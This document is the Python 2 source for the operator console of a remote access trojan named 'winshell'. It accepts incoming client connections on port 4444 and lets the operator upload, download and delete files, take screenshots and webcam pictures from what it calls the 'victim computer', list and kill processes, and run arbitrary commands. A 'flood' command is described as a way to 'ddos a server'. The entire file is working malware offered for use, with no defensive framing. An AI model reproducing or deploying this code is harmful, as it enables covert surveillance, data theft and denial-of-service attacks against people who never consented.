#coding:utf-8
import socket, platform, os, sys, threading, random
from module.banner.banner import *
from module.filetransfer.filetransfer import *
from colorama import init, Fore, Style

class Network:
	def __init__(self):
		self.all_connections = []
		self.all_addresses = []

	def wait_connections(self, green, default, blue):
		global c
		host = ""
		port = 4444



		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind((host, port))
		s.listen(5)
		
		while True:
			c, addr = s.accept()
			c.setblocking(1)

			self.all_connections.append(c)
			self.all_addresses.append(addr[0])
			print "\n{}[+]{} {} Connected !".format(green, default, addr[0])

	def list_clients(self, blue, default, send):
		clients = ""
		for i, c in enumerate(self.all_connections):
			try:
				c.send(send)
				c.recv(1024)
				clients += "{}[!]{} {})  {}\n".format(blue, default, i, self.all_addresses[i])
			except:
				del self.all_connections[i]
				del self.all_addresses[i]
		return clients

	def select_client(self, menu, green, red, default):
		iD = menu.split(" ")[1]
		try:
			iD = int(iD)
		except:
			print "{}[-]{} Please enter the client id".format(red, default)
			return None
		try:
			c = self.all_connections[iD]
		except IndexError:
			print "{}[-]{} Enter a valid id".format(red, default)
			return None

		print "{}[+]{} Connected on {}".format(green, default, self.all_addresses[iD])
		return 0

	def upload(self, cmd, green, red, default):
		cmdO = cmd.split(" ")
		c.send("upload")
		c.recv(1024)
		try:
			result = uploadFile(c, cmdO[1], red, default, cmdO[2])
		except IndexError:	
			result = uploadFile(c, cmdO[1], red, default)
		if result == "T":
			print "{}[+]{} Upload Complete".format(green, default) 

	def download(self, cmd, green, red, default):
		cmdO = cmd.split(" ")
		currentdir = os.getcwd()
		try:
			os.chdir(cmdO[2])
		except WindowsError:
			print "{}[-]{} '{}' doesn't exist".format(red, default, path)
			return
		except IndexError:
			pass
			
		c.send("download")
		c.recv(1024)
		result = downloadFile(c, cmdO[1], red, default)
		if result == "T":
			print "{}[+]{} Download Complete".format(green, default)
		os.chdir(currentdir)

	def screenshot(self, cmd, green, default):
		c.send(cmd)
		c.recv(1024)
		downloadFile(c, "screenshotFS.png",   red, default)
		print "{}[+]{} Screenshot saved as : '{}/screenshotFS.png'".format(green, default, os.getcwd())

	def printrecv(self, cmd, red, default):
		c.send(cmd)
		result = c.recv(2048)
		if result[:3] == "ERR":
			print "{}[-]{} {}".format(red, default, result[4:])

	def webcam_snap(self, cmd, blue, red, green, default):
		c.send(cmd)
		c.recv(1024)
		downloadFile(c, "wpicture.png", red, default)
		print "{}[+]{} Picture saved as : {}/wpicture.png".format(green, default, os.getcwd())

	def ls(self, cmd):
		c.send(cmd)
		nfile = c.recv(4096)
		if nfile != "//Nothing//":
			c.send("pwd")
			pwd = c.recv(1024)
			print "\n Contents of : {} \n".format(pwd)
			print nfile

	def getcmd(self):
		c.send("pwd")
		pwd = c.recv(1024)
		c.send("hostname")
		hostname = c.recv(1024)
		return hostname, pwd

	def ps(self, cmd):
		c.send(cmd)
		ps = c.recv(16192)
		if cmd == "ps":
			print 
			print " Name                                   Pid"
			print "------                                 -----"

			print ps
		else:
			if ps != "Null":
				print ps

	def send_command(self, cmd, blue=None, green=None, red=None, default=None):
		while True:
			if cmd[:7] == "upload ":
				self.upload(cmd, green, red, default)

			elif cmd[:9] == "download ":
				self.download(cmd, green, red, default)
	
			elif cmd == "screenshot":
				self.screenshot(cmd, green, default)

			elif cmd == "currentprocess" or cmd[:6] == "force " or cmd == "getpid" or cmd == "sysinfo":
				c.send(cmd)
				print c.recv(32768)

			elif cmd[:7] == "force2 " or cmd[:3] == "cd " or cmd[:5] == "kill " or cmd[:3] == "rm " or cmd[:6] == "rmdir ":
				self.printrecv(cmd, red, default)

			elif cmd == "webcam_snap":
				self.webcam_snap(cmd, blue, red, green, default)

			elif cmd == "ls":
				self.ls(cmd)

			elif cmd == "getcmd":
				hostname, pwd = self.getcmd()
				return hostname, pwd

			elif cmd == "ps" or cmd[:7] == "search ":
				self.ps(cmd)

			else:
				print "{}[-]{} '{}' is not a valid command type 'help' to see all the valid commands".format(red, default, cmd)
			return

class Console:
	def __init__(self):
		init()
		self.green = Fore.GREEN + Style.BRIGHT
		self.red = Fore.RED + Style.BRIGHT
		self.blue = Fore.BLUE + Style.BRIGHT
		self.default = Style.RESET_ALL + Style.BRIGHT

		self.Connection = Network()

	def menu(self):
		bannerL = [big, graffiti, slant, small, small_slant, ANSI_Shadow, bloody, chunky, speed]
		print "{}".format(self.blue)
		bannerfond = random.choice(bannerL)
		bannerfond()
		print "{}".format(self.default)


		t = threading.Thread(target=self.Connection.wait_connections, args=(self.green, self.default, self.blue))
		t.start()
		while True:
			menu = raw_input("{}[winshell]${} ".format(self.green, self.default))
			if menu == "list clients":
				clients = self.Connection.list_clients(self.blue, self.default, " ")
				if clients != "":
					print "{}[!]{} Clients connected:".format(self.blue, self.default)
					print clients
			
			elif menu[:9] == "interact ":
				c = self.Connection.select_client(menu, self.green, self.red, self.default)
				if c != None:
					self.winshellI()

			elif menu[:6] == "flood ":
				arg = int(menu.split(" ")[2])
				try:
					int(arg[2])
				except:
					print "{}[-]{} enter valid arguments".format(self.red, self.default)
				try:
					socket.gethostbyname(arg[1])
					self.Connection.list_clients(self.blue, self.default, menu)
					print "{}[+]{} Success !".format(self.green, self.default)
				except:
					print "{}[-]{} Cannot resolve '{}' Unknow host".format(self.red, self.default, arg[1])

			elif menu == "quit":
				exit(0)

			elif menu == "":
				continue

			elif menu == "help":
				print "list clients   : list all clients connected"
				print "interact <arg> : open a session with a client"
				print "flood <arg>    : ddos a server"

			else:
				print "{}[-]{} '{}' is not a valid command".format(self.red, self.default, menu)

	def help(self):
		print
		print "File System Commands"
		print "===================="
		print
		print " Commands         Description"
		print " --------         -----------"
		print " help             help menu"
		print " upload <arg>     upload a file"
		print " download <arg>   download a file"
		print " cd <arg>         change directory"
		print " ls               list files in current directory"
		print " rm <arg>         remove file"
		print " rmdir <arg>      remove directory"
		print " screenshot       take a screenshot from de victim computer"
		print " webcam_snap      take a webcam picture from de victim computeur"
		print
		print
		print "System Commands"
		print "==============="
		print
		print " getpid           get the current process id"
		print " ps               list running processes"
		print " search <arg>     filter running processes by name"
		print " currentprocess   get the current process run on the victim computer"
		print " start <arg>      start a process"
		print " kill <arg>       terminate the process designated by the PID"
		print " sysinfo          gets the details about the victim computer"
		print " force <arg>      force a subprocess.Popen"
		print " force2 <arg>     force a os.system"

	def winshellI(self):
			while True:
				hostname, pwd = self.Connection.send_command("getcmd")
				print
				cmd = raw_input("{}[{} {}{}]${} ".format(self.green, hostname, self.blue, pwd, self.default))
				if cmd == "":
					continue
	
				elif cmd == "help" or cmd == "?":
					self.help()
	
				elif cmd == "quit":
					print
					return
	
				else:
					self.Connection.send_command(cmd, self.blue, self.green, self.red, self.default)		
		#except:
		#	print 
		#	return
def Main():
	Winshell = Console()
	Winshell.menu()

if __name__ == '__main__':
	Main()
